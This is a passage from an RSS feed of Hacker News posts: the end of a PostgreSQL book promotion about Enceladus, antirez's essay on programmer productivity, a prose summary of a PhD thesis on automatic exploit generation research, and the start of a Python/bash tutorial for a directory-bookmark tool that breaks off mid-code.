data-css="tve-u-171a9e37e81"><p>This little moon is quite small, about <strong>the size of Texas</strong>, yet it jets water out continuously into space. Some of it rains back down as fine ice particles, covering the surface and making it the most reflective body in the solar system. Some of it gets sucked back into Saturn itself, making Enceladus the only moon we know of that contributes matter back to its host planet.</p><p>And <strong>some of it goes into orbit, creating the "E ring" </strong>of Saturn which you see above. That ghostly blue glow, the second largest planetary ring in the solar system, was created entirely from the icy jets of Enceladus... which is <strong>way too small to contribute that much material</strong>.</p></div></div>
</div></div>
</div><div data-css="tve-u-171a9fdfad8">

<div data-css="tve-u-171a9d26e2f"><p data-css="tve-u-171a9d37687">What the hell is going on up there?</p><div data-css="tve-u-171a9f0fd95"><p>I don't know...&nbsp;<strong><em>you tell me</em>.</strong> We can speculate all day about aliens, sunken UFOs and Thor's hidden palace but you know what would be even better? Letting the data tell us what's going on.</p><p>That's what we do as data people: <strong>let the data tell us the story</strong>. It's all in there, and with Cassini's mission data we have <strong>a gigantic amount that we get to sift through for answers</strong>.</p><p>That&nbsp;<em>you get to sift through</em>. <strong>Buckle up</strong>! PostgreSQL is fun and all, but it's the data behind this story that's the fun part. When you're done with this story, you'll be able to run (and understand) one hell of an amazing database query. These results were dubbed a "<strong>smoking gun for life</strong> in the waters of Enceladus" by <em>NASA itself</em>.</p></div><p><span><img alt="" data-id="161876" width="1200" data-init-width="1200" height="718" data-init-height="718" title="Image12632 copy" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?w=1200&amp;ssl=1 1200w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=1024%2C613&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=768%2C460&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=247%2C148&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image12632-copy.png?resize=510%2C305&amp;ssl=1 510w" sizes="(max-width: 1200px) 100vw, 1200px"></span></p><div data-css="tve-u-171a9e9683d" tcb-template-name="Call to Action 12" tcb-template-id="41889" data-keep-css_id="1"><div data-css="tve-u-171a9e9683e">

<div><div data-css="tve-u-171a9e96840"><div data-css="tve-u-171a9e96841"><div data-css="tve-u-171a9e96842"><div data-css="tve-u-171a9e96843"><p><span><img alt="" data-id="368" width="316" data-init-width="750" height="189" data-init-height="448" title="curious_slide" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg" data-width="316" data-height="189" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?w=750&amp;ssl=1 750w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=280%2C167&amp;ssl=1 280w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=550%2C329&amp;ssl=1 550w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2018/05/curious_slide.jpg?resize=300%2C179&amp;ssl=1 300w" sizes="(max-width: 316px) 100vw, 316px"></span></p></div></div><div data-css="tve-u-171a9e96845"><div data-css="tve-u-171a9e96846"><p data-css="tve-u-171a9e96847"><h3 data-css="tve-u-171a9f14274">The most fun you'll have learning something new.</h3></p><p>Spend the weekend with Dee and the gang at Red:4, digging in to the planetary mystery of Enceladus.</p></div></div></div></div></div>
</div></div></div>
</div><div data-inherit-lp-settings="1" data-css="tve-u-16cdd4acc71">

<div data-css="tve-u-16cdd4acc80"><p data-tag="h2" data-css="tve-u-16899a6ae75"><h2>Frequently Asked Questions
</h2></p><div data-css="tve-u-16898db49ac"><div data-css="tve-u-16898db468a"><div><div data-css="tve-u-16899be2e7e"><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899be7319" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd402a"><strong>Is this a print or digital book?</strong>
</h4>
</div>

</div>
</div>
</div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899be4c12" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd673c"><strong>Do I get any and all updates?&nbsp;</strong>
</h4>
</div>

</div>
</div>
</div></div></div><div><div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899bf19eb" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd4f6a"><strong>Is this for real? You must have made some of this up?</strong></h4>
</div>

</div>
</div>
</div><div data-hover-color="var(--tcb-color-1)" data-css="tve-u-16899bef9ab" data-tcb_hover_state_parent="" data-text-hover-color="var(--tcb-color-14)">
<div>
<div>
<div><h4 data-css="tve-u-16899bd7ef4">How can I get â€¦</h4></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bigmachine.io/products/a-curious-moon/">https://bigmachine.io/products/a-curious-moon/</a></em></p>]]>
            </description>
            <link>https://bigmachine.io/products/a-curious-moon/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149803</guid>
            <pubDate>Thu, 19 Nov 2020 14:29:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The mythical 10x programmer (repost)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149727">thread link</a>) | @sklivvz1971
<br/>
November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe Iâ€™m a very fast programmer. Considering Iâ€™m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmersâ€™ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you canâ€™t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental â€œproofs of conceptâ€ so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, itâ€™s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call â€œopportunistic programming.â€ Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>
<p>
At <a href="https://intelligenthack.com/en" alt="Intelligent Hack" title="Intelligent Hack">Intelligent Hack</a> we are expert in affecting cultural change in development companies that want to modernize their approach to development or improve so they can scale.
We are also able to help you implement agile methodologies, better software architecture, and scaling legacy software so you can concentrate on maximizing growth for your company instead of worrying about how to support it.
Feel free to contact us if you want to have a chat at <a href="https://sklivvz.com/cdn-cgi/l/email-protection" data-cfemail="3c54557c555248595050555b595248545d5f57125f535112">[email&nbsp;protected]</a>
</p>
</div></div>]]>
            </description>
            <link>https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149727</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PhD Thesis: Greybox Automatic Exploit Generation for Heap Overflows]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149725">thread link</a>) | @azhenley
<br/>
November 19, 2020 | https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/ | <a href="https://web.archive.org/web/*/https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2528">
		<!-- .entry-header -->

	<div>
					
<p>Over the summer I defended my PhD thesis. You can find it <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2020/11/heelan_phd_thesis.pdf" target="_blank">here</a>. </p>



<p>To give a super quick summary (prior to a rather verbose one ;)):</p>



<ul><li>Pre-2016 exploit generation was primarily focused on single-shot, completely automated exploits for stack-based buffer overflows in things like network daemons and file parsers. In my opinion, the architecture of such systems unlikely to enable exploit generation systems for more complex bug classes, different target software, and in the presence of mitigations. </li><li>Inspired by the success of fuzzing at bug finding, I wanted to bring greybox input generation to bear on exploit generation. As a monolithic problem exploit generation is too complex a task for this to be feasible, so I set about breaking exploit generation down into phases and implementing greybox solutions for each stage. I designed these phases to be composable, and used a template language to enable for communication of solutions between phases.  </li><li>Composable solver solutions and a human-writable template language gives two, new, powerful capabilities for an exploit generation engine: 1) â€œHuman in the loopâ€ means we can automate the things that are currently automatable, while allowing a human to solve the things we donâ€™t have good solvers for, and 2) If solutions are composable, and if a mock solution can be produced for any stage, then we can solve stages out of order. This leads to efficiency gains if a solution to one stage is expensive to produce, but we can mock it out and see if such a solution would even be useful to later stages, and then come back and solve for it if it does turn out to be useful. In practice I leveraged this to assume particular heap layouts, check if an exploit can be created from that point, and only come back and try to achieve that heap layout if it turns out to be exploitable. </li><li>My belief is that the future of exploit generation systems will be architectures in which fuzzing-esque input generation mechanisms are applied to granular tasks within exploit generation, and the solutions to these problems are composed via template languages that allow for human provided solutions as necessary. Symbolic execution will play a limited, but important role, when precise reasoning is required, and other over-approximate static analysis will likely be used to narrow the search problems that both the input generation and symex engines have to consider. </li><li>Youâ€™ll find a detailed description of the assumptions Iâ€™ve made in Chapter 1, as well as an outline of some of the most interesting future work, in my opinion, in the final chapter. </li></ul>



<p><strong>Background</strong></p>



<p>I originally worked on exploit generation in 2009 (MSc thesis <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2017/12/thesis-heelan.pdf" target="_blank">here</a>), and the approach I developed was to use concolic execution to build SMT formulas representing path semantics for inputs that cause the program to crash, then conjoin these formulas with a logical condition expressing what a successful exploit would look like, and ask an SMT solver to figure out what inputs are required to produce the desired output. This works in some scenarios where there are limited protection mechanisms (IoT junk, for example), but has a number of limitations that prevent it from being a reasonable path to real-world automatic exploit generation (AEG) solutions. Thereâ€™s the ever present issue with concolic execution that scaling it up to something like a web browser is a bit of an open problem, but the killer flaw is more conceptual, and it is worth explaining as it is the same flaw found at the heart of every exploit generation system I am aware of, right up to and including everything that participated in the DARPA Cyber Grand Challenge. </p>



<p>This earlier work (mine and others) essentially treats exploit generation as a two phase process. Firstly, they find a path to a location considered to be exploitable using a normal fuzzer or symbolic execution tool. â€˜Exploitableâ€™ almost always translates to â€˜return address on the stack overwrittenâ€™ in this case, and this input is then passed to a second stage to convert it to an exploit. That second stage consists of rewriting the bytes in the original input that corrupt a function pointer or return address, and potentially also rewriting some other bytes to provide a payload that will execute a shell, or something similar. This rewriting is usually done by querying an SMT solver. </p>



<p>The conceptual flaw in this approach is the idea that a crashing input as discovered by a fuzzer will, in one step, be transformable into a functioning exploit. In reality, a crashing input from a fuzzer is usually just the starting point of a journey to produce an exploit, and more often than not the initial input leading to that crash is largely discarded once the bug has been manually triaged. The exploit developer will then begin to use it as part of a larger exploit that may involve multiple stages, and leverage the bug as one component piece. </p>



<p><strong>Open Problems Circa 2016</strong></p>



<p>From 2009 to 2016 I worked on other things, but in 2016 I decided to return to academia to do a PhD and picked up the topic again. Reviewing the systems that had participated in the DARPA CGC [3], as well as prior work, there were a few apparent interesting open problems and opportunities:</p>



<ol><li>All systems I found were focused on entirely automated exploit generation, with no capacity for tandem exploit generation with a human in the loop.  </li><li>No research I could find had yet to pick up on the notion of an â€˜exploitation primitiveâ€™, which is fundamental in the manual construction of exploits, and will presumably be fundamental in any automated, or semi-automated approach. </li><li>All systems treated AEG as essentially a two step process of 1) Find a path that triggers a bug, 2) Transform that path into an exploit in one shot, rather than a multi-stage â€˜programmingâ€™ problem [4]. IMO, this is the primary limitation of these systems, as mentioned above, and the reason they are not extendable to more realistic scenarios. </li><li>Nobody was really leveraging greybox input generation approaches (fuzzing) extensively, outside of the task of bug finding.</li><li>Almost all systems were still focused on stack-based overflows.</li><li>Nobody was working on integrating information leaks, or dealing with ASLR, in their exploit generation systems. </li><li>Nobody was working on language interpreters/browsers.</li><li>Nobody was working on kernels.</li></ol>



<p>Itâ€™s likely that points 5-8 are the â€˜reasonâ€™ for points 1-4. Once you decide to start tackling any of 5-8, by necessity, you must start thinking about multi-stage exploit generation, having human assistance, addressing bug classes other than stack-based overflows, and using greybox approaches in order to avoid the scalability traps in symbolic execution. </p>



<p><strong>Research</strong></p>



<p>With the above in mind (I didnâ€™t touch 6 or 8), the primary goal for my PhD was to see if I could explore and validate some ideas that I think will push forward the state of the art, and form the foundation of AEG tools in the future. Those ideas are:</p>



<ol><li>Real exploits are often relatively complex programs, with multiple distinct phases in which different tasks must be solved. Much like with â€˜normalâ€™ program synthesis, it is likely that different tasks will require different solvers. Also, by breaking the problem down we naturally make it easier to solve as long as solutions to distinct phases are composable. Thus, <strong>my first goal was to break the exploitation process down into distinct phases, with the intention of implementing different solvers for each</strong>. An interesting side effect of breaking the exploit generation task down into multiple, distinct, phases was it allowed me to integrate the idea of <strong>â€˜lazyâ€™ resolution of these phases</strong>, and solve them out of order. In practice, what this meant was that if a solver for an early stage was much more expensive than a later stage then my system allowed one to â€˜mockâ€™ out a solution to the early stage, and only come back to solve it for real once it was validated that having a solution for it would actually lead to an exploit. </li><li>Once exploit generation is broken down into multiple phases, we have decisions to make about how to solve each. Symbolic execution has powered the core of most exploit generation engines, but it has terrible performance characteristics. OTOH fuzzing has proven itself to be vastly more scalable and applicable to a larger set of programs. Why hadnâ€™t fuzzing previously taken off as a primary component of of exploit generation? Well, if you treat exploit generation as a single, monolithic, problem then the state space is simply too large and thereâ€™s no reasonable feedback mechanism to navigate it. Greybox approaches that do input generation using mutation really need some sort of gradient to scale and a scoring mechanism to tell them how they are doing. Once we have broken the problem down into phases it becomes much easier to design feedback mechanisms for each stage, and the scale of the state space at each stage is also drastically reduced. <strong>My second goal was therefore to design purely greybox, fuzzing inspired, solutions for each phase of my exploitation pipeline</strong>. I purposefully committed to doing everything greybox to see how far I could push the idea, although in reality you would likely integrate an SMT solver for a few surgical tasks. </li><li>I knew it would be unlikely Iâ€™d hit upon the best solver for each pipeline stage at a first attempt, and itâ€™s even possible that a real solution for a particular pipeline stage might be an entire PhDâ€™s worth of research in itself. Thus it is important to enable one to swap out a particular automated solution for either a human provided solution, or an alternate solver. <strong>My third goal was then to figure out a way to enable multiple solvers to interact, be swappable, and to allow for a human in the loop</strong>. To enable this I designed a template approach whereby each stage, and a human exploit developer, could write and update exploits in a template language that further stages could understand and process. I wrote about what â€¦</li></ol></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/">https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/</a></em></p>]]>
            </description>
            <link>https://sean.heelan.io/2020/11/18/phd-thesis-greybox-automatic-exploit-generation-for-heap-overflows-in-language-interpreters/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149725</guid>
            <pubDate>Thu, 19 Nov 2020 14:23:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Goto, a command line directory bookmark app]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25149721">thread link</a>) | @ckotsis
<br/>
November 19, 2020 | https://blog.primef.org/posts/2020-11-16/directory-aliases/ | <a href="https://web.archive.org/web/*/https://blog.primef.org/posts/2020-11-16/directory-aliases/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
  <article>
    

    <main>
      <div>
        <p>The full code is available as a link in the end</p>
<h2 id="intro">Intro</h2>
<p>In this post I would like to show you how to build a simple app that manages directories with aliases.</p>
<p>What I mean by that? An app that will do the following</p>
<ul>
<li>Set aliases on a given directory</li>
<li>Navigate to that directory by calling the alias name</li>
<li>Delete or update aliases</li>
<li>Set workdir as a central goto point</li>
<li>Set bash autocompletion for our fun app</li>
</ul>
<p>When this is done you we will be able to set aliases like this</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ cd /some/pathA
<span>[</span>user@hostname pathA<span>]</span>$ goto set aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ cd /some/other/path
<span>[</span>user@hostname pathB<span>]</span>$ goto set aliasNameB
<span>[</span>user@hostname pathB<span>]</span>$ goto aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ 

</code></pre></div><p>Also we will be able to set a workdir that we can use as a relative point of movement</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ ls /some/path
dirA dirB dirC someFile ...
<span>[</span>user@hostname<span>]</span>$ goto set-pdir /some/path
<span>[</span>user@hostname<span>]</span>$ goto dirA
<span>[</span>user@hostname dirA<span>]</span>$ goto dirB
<span>[</span>user@hostname dirB<span>]</span>$  

</code></pre></div><p>We will implement this in two sections.</p>
<ul>
<li>Build the core app that will manage our aliases state</li>
<li>Create a bash script that will use the core app</li>
</ul>
<p>I am using python since it is faster to develop with and it is a standard tool used by linux engineers, and hence
python as a dependency is not an issue (for the majority of cases at least)</p>
<h2 id="core-app-for-working-with-our-state">Core App for working with our state</h2>
<p>The state app will be responsible for the following</p>
<ul>
<li>Write/Read/Update/Delete aliases to disk</li>
<li>Export aliase information back to the caller</li>
<li>List aliases</li>
</ul>
<p>First create <strong>goto</strong> directory</p>
<p>Let us create a file called <strong>state.py</strong> and start with our main class <strong>GotoState</strong></p>
<div><pre><code data-lang="python">
<span>#!/usr/bin/env python3</span>

<span>from</span> os <span>import</span> path

<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()

</code></pre></div><p>Inside <strong>init</strong> we are exporting the <strong>rootDir</strong> with value the absolute path to the goto workdir.
The reason we did that is because we want <strong>stateEnvFile</strong> to be relative to the <strong>state.py</strong> file and not
relative to the invokationâ€™s path.</p>
<p>Next we will add the code for creating and updating the <strong>.aliases.yml</strong> file. But before we do that, let us first
install pyyaml which will be the only dependency for this app (not considering python3, pip and bash)</p>
<p>Create a local directory called modules</p>
<p>Install pyyaml in modules</p>
<div><pre><code data-lang="bash">
pip install --target<span>=</span>modules/ pyyaml

pip3 freeze | grep <span>'PyYAML=='</span> &gt; requirements.txt

cat &gt; setup.sh <span>&lt;&lt;EOF
</span><span>pip install -r requirements.txt --target=modules/ 
</span><span>EOF</span>
</code></pre></div><p>Update <strong>state.py</strong> with the following code</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 0
</span><span> 1
</span><span><span> 2
</span></span><span><span> 3
</span></span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span><span>33
</span><span>34
</span><span>35
</span><span>36
</span><span>37
</span><span>38
</span><span>39
</span><span>40
</span><span>41
</span><span>42
</span><span>43
</span><span>44
</span><span>45
</span></code></pre></td>
<td>
<pre><code data-lang="python"><span>#!/usr/bin/env python3</span>

<span><span>from</span> sys <span>import</span> path <span>as</span> syspath
</span><span>syspath<span>.</span>insert(<span>0</span>, <span>'modules'</span>)
</span>
<span>from</span> sys <span>import</span> argv, stdout
<span>from</span> os <span>import</span> path
<span>import</span> yaml


<span>class</span> <span>LoadConfig</span>():
    <span>def</span> <span>read_conf</span>(self, docFile):
        stateFile <span>=</span> docFile
        <span>with</span> open(stateFile, <span>'r'</span>) <span>as</span> _STREAM:
            <span>try</span>:
                _CFG <span>=</span> yaml<span>.</span>safe_load(_STREAM)
            <span>except</span> yaml<span>.</span>YAMLError <span>as</span> _EXC:
                <span>raise</span>

        <span>return</span> _CFG

    <span>def</span> <span>update_conf</span>(self, docFile, docCont):
        stateFile <span>=</span> docFile
        <span>with</span> open(stateFile, <span>'w'</span>) <span>as</span> file:
            yaml<span>.</span>dump(docCont, file)


<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

        <span>if</span> path<span>.</span>isfile(self<span>.</span>stateEnvFile):
            self<span>.</span>stateEnv <span>=</span> self<span>.</span>read_conf(docFile<span>=</span>self<span>.</span>stateEnvFile)
        <span>else</span>:
            self<span>.</span>stateEnv <span>=</span> {
                <span>'aliases'</span>: {},
                <span>'workdir'</span>: self<span>.</span>rootDir,
            }
            self<span>.</span>update_conf(
                docFile<span>=</span>self<span>.</span>stateEnvFile,
                docCont<span>=</span>self<span>.</span>stateEnv
            )

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()</code></pre></td></tr></tbody></table>
</div>
</div>
<ul>
<li>Note on lines (2 - 3) we are pushing to syspath.index 0 our local modules</li>
<li>On lines (11 - 25) we define the classfunction that will read and update our state file</li>
<li>On lines (33 - 43) we simply check if the file exists, in cases it does not we create it and populate it with a directory</li>
</ul>
<p>Now that we have the code to create and update our state file we can add some methods to work with it</p>
<p>First we will add the <strong>add</strong> method for inserting new items in the state file</p>
<p>Append to the <strong>GotoState</strong> class the following code</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 0
</span><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="python">    <span>def</span> <span>check_paths</span>(self, p, <span>**</span>kwargs):
        <span>if</span> p<span>.</span>endswith(<span>"/"</span>) <span>and</span> len(p) <span>&gt;</span> <span>1</span>:
            p <span>=</span> p[:len(p)<span>-</span><span>1</span>] 
        <span>if</span> kwargs[<span>"opts"</span>]<span>.</span>get(<span>"show"</span>, False):
            <span>print</span>(p)
        <span>else</span>:
            <span>return</span> p

    <span>def</span> <span>add</span>(self, alias, p):
        cpath <span>=</span> self<span>.</span>check_paths(p, opts<span>=</span>{})
        self<span>.</span>stateEnv[<span>"aliases"</span>][alias] <span>=</span> cpath
        self<span>.</span>update_conf(
            docFile<span>=</span>self<span>.</span>stateEnvFile, 
            docCont<span>=</span>self<span>.</span>stateEnv
        )</code></pre></td></tr></tbody></table>
</div>
</div>
<p>Initially we define <strong>check_paths</strong> method which simply trims any trailing / from the path.
The condition is there because the method will also be called from the caller sometimes, therefore we need
to send a result back.</p>
<p>Then we define the <strong>add</strong> method which simple calls <strong>check_paths</strong> and then updates the state file with the gievn path</p>
<p>To test this, first add the following in the <strong><strong>name</strong> == <strong>main</strong></strong> section at the end</p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})

</code></pre></div><p>We could start developing argparse but I think it is too much for this app since</p>
<ul>
<li>it will have few methods</li>
<li>it will only be called from the caller script</li>
</ul>
<p>Letâ€™s test <strong>add</strong></p>
<div><pre><code data-lang="bash">
python state.py add root /

cat .aliases.yml 
aliases:
  root: /
workdir: /home/user/test

</code></pre></div><p>Next we will add the <strong>list_aliases</strong> method</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>0
</span><span>1
</span><span>2
</span></code></pre></td>
<td>
<pre><code data-lang="python">    <span>def</span> <span>list_aliases</span>(self):
        aliases <span>=</span> [<span>"</span><span>%s</span><span>::::</span><span>%s</span><span>"</span> <span>%</span> (x, self<span>.</span>stateEnv[<span>"aliases"</span>][x]) <span>for</span> x <span>in</span> self<span>.</span>stateEnv[<span>"aliases"</span>]]
        <span>print</span>(<span>","</span><span>.</span>join(aliases))</code></pre></td></tr></tbody></table>
</div>
</div>
<p>The reason I decided to join the alias name and its path with <strong>::::</strong> is in order to make the caller able
to split the string and easily derive the name and path. There is no special perpuse for selecting <strong>::::</strong>,
I just did.</p>
<p>Also add the respective if condition under <strong><strong>main</strong></strong></p>
<div><pre><code data-lang="python">
<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()
    <span>if</span> argv[<span>1</span>] <span>==</span> <span>"add"</span>:
        gotoState<span>.</span>add(argv[<span>2</span>], argv[<span>3</span>])
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"check_paths"</span>:
        gotoState<span>.</span>check_paths(argv[<span>2</span>], opts<span>=</span>{<span>"show"</span>: True})
    <span>elif</span> argv[<span>1</span>] <span>==</span> <span>"list"</span>:
